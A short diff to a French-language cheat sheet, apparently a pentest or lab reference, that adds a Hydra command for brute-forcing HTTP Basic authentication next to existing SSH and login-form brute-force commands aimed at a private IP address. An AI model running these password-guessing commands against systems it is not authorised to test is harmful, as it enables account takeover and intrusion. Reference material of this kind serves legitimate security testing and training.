@@ -82,6 +82,11 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt 10.67.142.78 -t 4 ssh
 ```bash
 hydra -l admin -P passlist.txt 10.67.142.78 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid" -V
 ```
+Pour une Basic auth
+
+```bash
+hydra -l admin -P passlist.txt 10.67.142.78 http-get /path -vV
+```
 
 - `^USER^` et `^PASS^` sont remplacés automatiquement
 - `F=Invalid` → échec si la réponse contient "Invalid"
